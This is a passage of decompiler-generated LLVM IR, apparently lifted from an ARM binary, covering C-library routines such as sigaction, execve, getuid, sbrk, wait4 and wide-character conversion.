dec_label_pc_17884:                               ; preds = %dec_label_pc_17874, %dec_label_pc_17868, %dec_label_pc_17848, %dec_label_pc_17834
  %v2_1788c = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_17898 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_178a4 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_178f0

dec_label_pc_178f0:                               ; preds = %dec_label_pc_17884, %dec_label_pc_1785c
  %v0_178b4 = load i32, i32* @r6, align 4
  %v1_178b4 = inttoptr i32 %v0_178b4 to i32*
  %v2_178b4 = load i32, i32* %v1_178b4, align 4
  store i32 %v2_178b4, i32* @global_var_28bfc, align 4
  store i32 %arg5, i32* @global_var_2ee88.1072, align 4
  %v2_178f0 = icmp eq i32 %arg4, 0
  br i1 %v2_178f0, label %dec_label_pc_1792c, label %bb47

bb47:                                             ; preds = %dec_label_pc_178f0
  br label %dec_label_pc_1792c

dec_label_pc_1792c:                               ; preds = %dec_label_pc_178f0, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_1793c = call i32 @__errno_location()
  %v2_17944 = inttoptr i32 %v1_1793c to i32*
  store i32 0, i32* %v2_17944, align 4
  %v1_17958 = call i32 @__GI___h_errno_location()
  %v2_17960 = inttoptr i32 %v1_17958 to i32*
  store i32 0, i32* %v2_17960, align 4
  %v0_17970 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_1797c = call i32 @__GI_exit(i32 %v0_17970)
  ret i32 %v1_1797c

; uselistorder directives
  uselistorder i32 %v2_177fc, { 1, 0 }
  uselistorder i32 %v1_177f8, { 1, 0 }
  uselistorder i1 %v2_177e4, { 1, 0 }
  uselistorder i32 %v4_177cc, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_2ee84.992, { 1, 4, 0, 2, 3 }
  uselistorder i32 14, { 2, 1, 0 }
  uselistorder i32 13, { 1, 3, 0, 2 }
  uselistorder i32 120, { 2, 0, 1 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1792c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_177fc, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_177e4, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_179b4 = load i32, i32* @r4, align 4
  %v6_179b4 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_179b8 = icmp eq i32* %arg2, null
  %v2_179bc = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_179b8, label %dec_label_pc_17a28, label %dec_label_pc_179cc

dec_label_pc_179cc:                               ; preds = %entry
  %v2_179d0 = load i32, i32* %arg2, align 4
  %v4_179d0 = add i32 %tmp, 4
  store i32 %v4_179d0, i32* @r1, align 4
  %v2_179d4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_179d4, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_179d0, i32* %stack_var_-156, align 4
  %v0_179e0 = call i32 @memcpy()
  store i32 %v0_179e0, i32* %r0.global-to-local, align 4
  %v0_179e4 = load i32, i32* @r4, align 4
  %v1_179e4 = add i32 %v0_179e4, 132
  %v2_179e4 = inttoptr i32 %v1_179e4 to i32*
  %v3_179e4 = load i32, i32* %v2_179e4, align 4
  %v1_179e8 = and i32 %v3_179e4, 67108864
  %v2_179e8 = icmp eq i32 %v1_179e8, 0
  br i1 %v2_179e8, label %dec_label_pc_179fc, label %bb

bb:                                               ; preds = %dec_label_pc_179cc
  br label %dec_label_pc_17a18

dec_label_pc_179fc:                               ; preds = %dec_label_pc_179cc
  %v1_17a04 = and i32 %v3_179e4, 4
  %v2_17a04 = icmp eq i32 %v1_17a04, 0
  br i1 %v2_17a04, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_179fc
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_179fc, %bb20
  br label %dec_label_pc_17a18

dec_label_pc_17a18:                               ; preds = %bb, %bb21
  %v2_17a18 = icmp eq i32 %v0_179e4, 0
  %v3_17a1c = ptrtoint i32* %stack_var_-156 to i32
  %.v3_17a1c = select i1 %v2_17a18, i32 0, i32 %v3_17a1c
  %v0_17a28.pre = load i32, i32* @r5, align 4
  %v0_17a38.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17a28

dec_label_pc_17a28:                               ; preds = %dec_label_pc_17a18, %entry
  %v0_17a38 = phi i32 [ %arg1, %entry ], [ %v0_17a38.pre, %dec_label_pc_17a18 ]
  %v0_17a28 = phi i32 [ %arg3, %entry ], [ %v0_17a28.pre, %dec_label_pc_17a18 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_17a1c, %dec_label_pc_17a18 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_17a28 = icmp eq i32 %v0_17a28, 0
  %.v2_179bc = select i1 %v2_17a28, i32 0, i32 %v2_179bc
  store i32 %.v2_179bc, i32* @r2, align 4
  store i32 %v0_17a38, i32* %r0.global-to-local, align 4
  %v1_17a3c = call i32 @__syscall_rt_sigaction(i32 %v0_17a38)
  store i32 %v1_17a3c, i32* %r0.global-to-local, align 4
  %v0_17a40 = load i32, i32* @r5, align 4
  %v2_17a40 = icmp eq i32 %v0_17a40, 0
  br i1 %v2_17a40, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_17a28
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_17a28, %bb25
  %v0_17a50.pr = phi i32 [ 0, %dec_label_pc_17a28 ], [ 1, %bb25 ]
  %v1_17a48 = icmp slt i32 %v1_17a3c, 0
  br i1 %v1_17a48, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_17a84

thread-pre-split:                                 ; preds = %bb26
  %v2_17a50 = icmp eq i32 %v0_17a50.pr, 0
  store i32 %v1_17a3c, i32* @r4, align 4
  br i1 %v2_17a50, label %dec_label_pc_17a84, label %dec_label_pc_17a5c

dec_label_pc_17a5c:                               ; preds = %thread-pre-split
  %v2_17a5c = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_17a40, i32* %r0.global-to-local, align 4
  %v2_17a64 = inttoptr i32 %v0_17a40 to i32*
  store i32 %v2_17a5c, i32* %v2_17a64, align 4
  %v3_17a64 = load i32, i32* %r0.global-to-local, align 4
  %v4_17a64 = add i32 %v3_17a64, 4
  store i32 %v4_17a64, i32* @r0, align 4
  %v2_17a68 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_17a68, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_17a70 = call i32 @memcpy()
  store i32 %v0_17a70, i32* %r0.global-to-local, align 4
  %v1_17a78 = load i32, i32* @r5, align 4
  %v2_17a78 = add i32 %v1_17a78, 136
  %v3_17a78 = inttoptr i32 %v2_17a78 to i32*
  %v1_17a80 = load i32, i32* @r5, align 4
  %v2_17a80 = add i32 %v1_17a80, 132
  %v3_17a80 = inttoptr i32 %v2_17a80 to i32*
  %v0_17a84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17a84

dec_label_pc_17a84:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_17a5c
  %v0_17a84 = phi i32 [ %v1_17a3c, %thread-pre-split ], [ %v0_17a84.pre, %dec_label_pc_17a5c ], [ %v1_17a3c, %thread-pre-split.thread ]
  store i32 %v0_17a84, i32* %r0.global-to-local, align 4
  store i32 %v3_179b4, i32* @r4, align 4
  store i32 %v6_179b4, i32* @r5, align 4
  ret i32 %v0_17a84

; uselistorder directives
  uselistorder i32 %v0_17a84, { 1, 0 }
  uselistorder i32 %v0_17a40, { 1, 0, 2 }
  uselistorder i32 %v0_17a38, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder i32 136, { 1, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17a84, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_17a18, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_17a98 = load i32, i32* @r4, align 4
  store i32 %v3_17a98, i32* %stack_var_-8, align 4
  %v0_17a9c = load i32, i32* @r0, align 4
  %v0_17aa0 = call i32 @__errno_location()
  %v1_17aa4 = sub i32 0, %v0_17a9c
  %v2_17aa8 = inttoptr i32 %v0_17aa0 to i32*
  store i32 %v1_17aa4, i32* %v2_17aa8, align 4
  %v2_17ab0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17ab0, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_17ab4 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_17ab4
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_17ab8 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_17ab8
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17abc = load i32, i32* @r4, align 4
  store i32 %v3_17abc, i32* %stack_var_-8, align 4
  %v1_17ac0 = load i32, i32* @r1, align 4
  %v2_17ac0 = inttoptr i32 %v1_17ac0 to %sigaction*
  %v3_17ac0 = load i32, i32* @r2, align 4
  %v4_17ac0 = inttoptr i32 %v3_17ac0 to %sigaction*
  %v5_17ac0 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_17ac0, %sigaction* %v4_17ac0)
  store i32 %v5_17ac0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_17ac0, -4095
  br i1 %tmp, label %dec_label_pc_17ae0, label %dec_label_pc_17ad0

dec_label_pc_17ad0:                               ; preds = %entry
  %v0_17ad0 = call i32 @__errno_location()
  %v0_17ad4 = load i32, i32* %r4.global-to-local, align 4
  %v1_17ad4 = sub i32 0, %v0_17ad4
  %v2_17ad8 = inttoptr i32 %v0_17ad0 to i32*
  store i32 %v1_17ad4, i32* %v2_17ad8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17ae0

dec_label_pc_17ae0:                               ; preds = %entry, %dec_label_pc_17ad0
  %v0_17ae0 = phi i32 [ %v5_17ac0, %entry ], [ -1, %dec_label_pc_17ad0 ]
  %v2_17ae4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17ae4, i32* %r4.global-to-local, align 4
  ret i32 %v0_17ae0

; uselistorder directives
  uselistorder i32 %v5_17ac0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17ae0, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17ae8 = load i32, i32* @r4, align 4
  store i32 %v3_17ae8, i32* %stack_var_-8, align 4
  %v0_17aec = load i32, i32* @r0, align 4
  %v1_17aec = inttoptr i32 %v0_17aec to i8*
  %v2_17aec = load i32, i32* @r1, align 4
  %v3_17aec = inttoptr i32 %v2_17aec to i8*
  %v4_17aec = insertvalue [1 x i8*] undef, i8* %v3_17aec, 0
  %v5_17aec = load i32, i32* @r2, align 4
  %v6_17aec = inttoptr i32 %v5_17aec to i8*
  %v7_17aec = insertvalue [1 x i8*] undef, i8* %v6_17aec, 0
  %v8_17aec = call i32 @execve(i8* %v1_17aec, [1 x i8*] %v4_17aec, [1 x i8*] %v7_17aec)
  store i32 %v8_17aec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_17aec, -4095
  br i1 %tmp, label %dec_label_pc_17b0c, label %dec_label_pc_17afc

dec_label_pc_17afc:                               ; preds = %entry
  %v0_17afc = call i32 @__errno_location()
  %v0_17b00 = load i32, i32* %r4.global-to-local, align 4
  %v1_17b00 = sub i32 0, %v0_17b00
  %v2_17b04 = inttoptr i32 %v0_17afc to i32*
  store i32 %v1_17b00, i32* %v2_17b04, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17b0c

dec_label_pc_17b0c:                               ; preds = %entry, %dec_label_pc_17afc
  %v0_17b0c = phi i32 [ %v8_17aec, %entry ], [ -1, %dec_label_pc_17afc ]
  %v2_17b10 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17b10, i32* @r4, align 4
  ret i32 %v0_17b0c

; uselistorder directives
  uselistorder i32 %v8_17aec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17b0c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17b14 = load i32, i32* @r4, align 4
  store i32 %v3_17b14, i32* %stack_var_-8, align 4
  %v0_17b1c = load i32, i32* @r0, align 4
  store i32 %v0_17b1c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17b1c, -4095
  br i1 %tmp, label %dec_label_pc_17b38, label %dec_label_pc_17b28

dec_label_pc_17b28:                               ; preds = %entry
  %v0_17b28 = call i32 @__errno_location()
  %v0_17b2c = load i32, i32* %r4.global-to-local, align 4
  %v1_17b2c = sub i32 0, %v0_17b2c
  %v2_17b30 = inttoptr i32 %v0_17b28 to i32*
  store i32 %v1_17b2c, i32* %v2_17b30, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17b3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17b38

dec_label_pc_17b38:                               ; preds = %entry, %dec_label_pc_17b28
  %v2_17b3c = phi i32 [ %v3_17b14, %entry ], [ %v2_17b3c.pre, %dec_label_pc_17b28 ]
  %v0_17b38 = phi i32 [ %v0_17b1c, %entry ], [ -1, %dec_label_pc_17b28 ]
  store i32 %v2_17b3c, i32* @r4, align 4
  ret i32 %v0_17b38

; uselistorder directives
  uselistorder i32 %v0_17b1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17b38, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17b40 = load i32, i32* @r4, align 4
  store i32 %v3_17b40, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17b64, label %dec_label_pc_17b54

dec_label_pc_17b54:                               ; preds = %entry
  %v0_17b54 = call i32 @__errno_location()
  %v0_17b58 = load i32, i32* %r4.global-to-local, align 4
  %v1_17b58 = sub i32 0, %v0_17b58
  %v2_17b5c = inttoptr i32 %v0_17b54 to i32*
  store i32 %v1_17b58, i32* %v2_17b5c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17b68.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17b64

dec_label_pc_17b64:                               ; preds = %entry, %dec_label_pc_17b54
  %v2_17b68 = phi i32 [ %v3_17b40, %entry ], [ %v2_17b68.pre, %dec_label_pc_17b54 ]
  %v0_17b64 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_17b54 ]
  store i32 %v2_17b68, i32* %r4.global-to-local, align 4
  ret i32 %v0_17b64

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17b64, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17b6c = load i32, i32* @r4, align 4
  store i32 %v3_17b6c, i32* %stack_var_-8, align 4
  %v0_17b74 = load i32, i32* @r0, align 4
  store i32 %v0_17b74, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17b74, -4095
  br i1 %tmp, label %dec_label_pc_17b90, label %dec_label_pc_17b80

dec_label_pc_17b80:                               ; preds = %entry
  %v0_17b80 = call i32 @__errno_location()
  %v0_17b84 = load i32, i32* %r4.global-to-local, align 4
  %v1_17b84 = sub i32 0, %v0_17b84
  %v2_17b88 = inttoptr i32 %v0_17b80 to i32*
  store i32 %v1_17b84, i32* %v2_17b88, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17b94.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17b90

dec_label_pc_17b90:                               ; preds = %entry, %dec_label_pc_17b80
  %v2_17b94 = phi i32 [ %v3_17b6c, %entry ], [ %v2_17b94.pre, %dec_label_pc_17b80 ]
  %v0_17b90 = phi i32 [ %v0_17b74, %entry ], [ -1, %dec_label_pc_17b80 ]
  store i32 %v2_17b94, i32* %r4.global-to-local, align 4
  ret i32 %v0_17b90

; uselistorder directives
  uselistorder i32 %v0_17b74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17b90, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_17b98 = load i32, i32* @r4, align 4
  store i32 %v3_17b98, i32* %stack_var_-8, align 4
  %v6_17b9c = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_17b9c, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_17b9c, -4095
  br i1 %tmp6, label %dec_label_pc_17bbc, label %dec_label_pc_17bac

dec_label_pc_17bac:                               ; preds = %entry
  %v0_17bac = call i32 @__errno_location()
  %v0_17bb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_17bb0 = sub i32 0, %v0_17bb0
  %v2_17bb4 = inttoptr i32 %v0_17bac to i32*
  store i32 %v1_17bb0, i32* %v2_17bb4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17bbc

dec_label_pc_17bbc:                               ; preds = %entry, %dec_label_pc_17bac
  %v0_17bbc = phi i32 [ %v6_17b9c, %entry ], [ -1, %dec_label_pc_17bac ]
  %v2_17bc0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17bc0, i32* %r4.global-to-local, align 4
  ret i32 %v0_17bbc

; uselistorder directives
  uselistorder i32 %v6_17b9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17bbc, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17bc4 = load i32, i32* @r4, align 4
  store i32 %v3_17bc4, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2eeb8.1105 to i32), i32* %r4.global-to-local, align 4
  %v2_17bcc = load i32, i32* @global_var_2eeb8.1105, align 4
  %v2_17bd0 = icmp eq i32 %v2_17bcc, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_17bd0, label %dec_label_pc_17be0, label %dec_label_pc_17bec

dec_label_pc_17be0:                               ; preds = %entry
  %v2_17be0 = call i32 @__GI_brk(i32* null)
  %v1_17be4 = icmp slt i32 %v2_17be0, 0
  br i1 %v1_17be4, label %dec_label_pc_17c0c, label %dec_label_pc_17becthread-pre-split

dec_label_pc_17becthread-pre-split:               ; preds = %dec_label_pc_17be0
  %v0_17bf0.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_17bec.pre = load i32, i32* @global_var_2eeb8.1105, align 4
  br label %dec_label_pc_17bec

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17becthread-pre-split, %entry
  %v2_17bec = phi i32 [ %v2_17bec.pre, %dec_label_pc_17becthread-pre-split ], [ %v2_17bcc, %entry ]
  %v1_17bf8 = phi i32 [ %v0_17bf0.pr, %dec_label_pc_17becthread-pre-split ], [ %arg1, %entry ]
  %v2_17bf0 = icmp eq i32 %v1_17bf8, 0
  store i32 %v2_17bec, i32* %r4.global-to-local, align 4
  br i1 %v2_17bf0, label %dec_label_pc_17c10, label %dec_label_pc_17c00

dec_label_pc_17c00:                               ; preds = %dec_label_pc_17bec
  %v2_17bf8 = add i32 %v1_17bf8, %v2_17bec
  %v1_17c00 = inttoptr i32 %v2_17bf8 to i32*
  %v2_17c00 = call i32 @__GI_brk(i32* %v1_17c00)
  %v1_17c04 = icmp slt i32 %v2_17c00, 0
  br i1 %v1_17c04, label %dec_label_pc_17c0c, label %dec_label_pc_17c00.dec_label_pc_17c10_crit_edge

dec_label_pc_17c00.dec_label_pc_17c10_crit_edge:  ; preds = %dec_label_pc_17c00
  %v0_17c10.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17c10

dec_label_pc_17c0c:                               ; preds = %dec_label_pc_17c00, %dec_label_pc_17be0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17c10

dec_label_pc_17c10:                               ; preds = %dec_label_pc_17c00.dec_label_pc_17c10_crit_edge, %dec_label_pc_17bec, %dec_label_pc_17c0c
  %v0_17c10 = phi i32 [ %v0_17c10.pre, %dec_label_pc_17c00.dec_label_pc_17c10_crit_edge ], [ %v2_17bec, %dec_label_pc_17bec ], [ -1, %dec_label_pc_17c0c ]
  %v2_17c14 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17c14, i32* @r4, align 4
  ret i32 %v0_17c10

; uselistorder directives
  uselistorder i32 %v2_17bec, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18, 19, 20, 21, 22, 28, 29, 26, 27, 25, 24, 23, 30, 31, 32, 2 }
  uselistorder label %dec_label_pc_17c10, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17c1c = load i32, i32* @r4, align 4
  store i32 %v3_17c1c, i32* %stack_var_-8, align 4
  %v0_17c20 = call i32 @wait4()
  store i32 %v0_17c20, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17c20, -4095
  br i1 %tmp, label %dec_label_pc_17c40, label %dec_label_pc_17c30

dec_label_pc_17c30:                               ; preds = %entry
  %v0_17c30 = call i32 @__errno_location()
  %v0_17c34 = load i32, i32* %r4.global-to-local, align 4
  %v1_17c34 = sub i32 0, %v0_17c34
  %v2_17c38 = inttoptr i32 %v0_17c30 to i32*
  store i32 %v1_17c34, i32* %v2_17c38, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17c40

dec_label_pc_17c40:                               ; preds = %entry, %dec_label_pc_17c30
  %v0_17c40 = phi i32 [ %v0_17c20, %entry ], [ -1, %dec_label_pc_17c30 ]
  %v2_17c44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17c44, i32* @r4, align 4
  ret i32 %v0_17c40

; uselistorder directives
  uselistorder i32 %v0_17c20, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17c40, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2ee98.1107 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_17c58 = icmp eq i32 %arg1, 0
  br i1 %v2_17c58, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_17c60 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_17c88 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_17c7c = phi i32 [ %arg1, %.thread ], [ %v3_17c60, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_17c74 = ptrtoint i32* %stack_var_-16 to i32
  %v2_17c80 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_17c80, i32* %stack_var_-16, align 4
  store i32 %v0_17c88, i32* %stack_var_-12, align 4
  %v5_17c90 = inttoptr i32 %v0_17c7c to i8*
  %v6_17c90 = call i32 @__GI_wcsnrtombs(i8* %v5_17c90, i32 %v2_17c74, i32 1, i32 16, i32 %arg3)
  %v2_17c94 = icmp eq i32 %v6_17c90, 0
  br i1 %v2_17c94, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_17ca0 = phi i32 [ %v6_17c90, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_17ca0

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_17cb0 = load i32, i32* @r2, align 4
  store i32 %v0_17cb0, i32* @r3, align 4
  %v0_17cb8 = load i32, i32* @r0, align 4
  %v1_17cb8 = load i32, i32* @r1, align 4
  %v5_17cb8 = inttoptr i32 %v0_17cb8 to i8*
  %v6_17cb8 = call i32 @__GI_wcsnrtombs(i8* %v5_17cb8, i32 %v1_17cb8, i32 -1, i32 %v0_17cb0, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_17cb8
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17cc4 = load i32, i32* @r4, align 4
  store i32 %v3_17cc4, i32* %stack_var_-8, align 4
  %v10_17cc8 = icmp eq i32 %tmp, %arg2
  br i1 %v10_17cc8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_17cd01 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17ce4

bb:                                               ; preds = %entry
  %v4_17ccc = icmp eq i8* %arg1, null
  %v0_17cd0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_17ccc, label %dec_label_pc_17ce4, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d20

dec_label_pc_17ce4:                               ; preds = %.thread, %bb
  %v1_17d24.ph = phi i32 [ %v0_17cd0, %bb ], [ %v0_17cd01, %.thread ]
  %v2_17cd43.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_17ce4 = icmp eq i8* %arg1, null
  store i32 %v2_17cd43.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_17ce4, label %.thread4, label %dec_label_pc_17d18

.thread4:                                         ; preds = %dec_label_pc_17ce4
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_17d20

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17d38
  %v0_17cfc = call i32 @__errno_location()
  store i32 %v0_17cfc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_17d08 = inttoptr i32 %v0_17cfc to i32*
  store i32 84, i32* %v2_17d08, align 4
  %v0_17d74.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d74

dec_label_pc_17d10:                               ; preds = %dec_label_pc_17d48
  %v3_17d4c = zext i8 %v2_17d4c to i32
  store i32 %v3_17d4c, i32* @lr, align 4
  br label %dec_label_pc_17d68

dec_label_pc_17d18:                               ; preds = %dec_label_pc_17ce4
  store i32 %v2_17cd43.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17d20

dec_label_pc_17d20:                               ; preds = %bb27, %.thread4, %dec_label_pc_17d18
  %v1_17d2420 = phi i32 [ %v0_17cd0, %bb27 ], [ %v1_17d24.ph, %.thread4 ], [ %v1_17d24.ph, %dec_label_pc_17d18 ]
